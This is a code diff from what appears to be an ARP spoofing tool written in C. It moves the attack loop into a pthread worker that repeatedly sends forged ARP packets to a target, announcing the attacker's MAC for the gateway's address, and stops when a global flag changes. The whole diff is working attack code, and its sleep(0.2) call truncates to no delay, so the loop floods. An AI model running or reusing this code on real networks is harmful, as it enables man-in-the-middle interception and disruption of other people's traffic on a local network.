@@ -11,10 +11,13 @@
 #include <net/if.h>
 #include <netdb.h>
 #include <linux/if_arp.h>
+#include <pthread.h>
 
 # include "struct.h"
 # include "define.h"
 # include "utils.h"
+
+extern int g_stop;
 
 static SOCKET initiate_socket_for_arp(const char ifacename[IFNAMSIZ])
 {
@@ -37,19 +40,26 @@ err:
 	return(-1);	
 }
 
-int start_attack_one(const struct arguments *arguments, nmap_r *target)
+typedef struct arpthreadinfo
 {
+	SOCKET iface;
+	const struct arguments *arguments;
+	nmap_r *target;
+}	arpthreadinfo;
+
+static void *arpthread(void *argp)
+{
+	struct arpthreadinfo *arg = argp;
+	const struct arguments *arguments = arg->arguments;
+	nmap_r *target = arg->target;
+	SOCKET iface = arg->iface;
+
 	unsigned char payload[42] = { 0x0 };
-	SOCKET iface = -1;
 	eth *eth_hdr = (eth*)payload;
 	arp *arp_hdr = (arp*)(payload + ETH_HLEN);
 	struct sockaddr_ll ifaceinfo = { 0x0 };
 	socklen_t ifaceinfolen;
 	size_t rlen;
-
-	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
-		goto err;
-	TELLSOCKETSUCCESS(arguments->ifacename);
 
 	copy_mac(eth_hdr->dest_addr, target->ha);	/* 6 bytes dest addr */
 	copy_mac(eth_hdr->src_addr, arguments->self_ha);	/* 6 bytes src addr (us) */
@@ -74,13 +84,40 @@ int start_attack_one(const struct arguments *arguments, nmap_r *target)
 	ifaceinfo.sll_addr[7] = 0x00;
 
 	TELLNUKINGTARGET(target->pa, arguments->gateway_pa, arguments->self_ha);
-	while (1) {
+
+	while (g_stop == 1) {
 		rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));
 
 		if (rlen != ETH_HLEN + ARP_HLEN)
 			{ ERROR_SEND(); goto err; }
 		sleep(0.2); // need to match ppm in arg structure
 	}
+	return NULL;
+err:
+	return NULL;
+}
+
+int start_attack_one(const struct arguments *arguments, nmap_r *target)
+{
+	SOCKET iface = -1;
+	pthread_t thread;
+	struct arpthreadinfo argp;
+
+
+	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
+		goto err;
+	TELLSOCKETSUCCESS(arguments->ifacename);
+
+	argp.iface = iface;
+	argp.arguments = arguments;
+	argp.target = target;
+
+	start_signal();
+	pthread_create(&thread, NULL, arpthread, &argp);
+	pthread_join(thread, NULL);
+	stop_signal();
+	g_stop = 1;
+	TELLSTOPATTACK();
 
 	close(iface);
 	return 0;
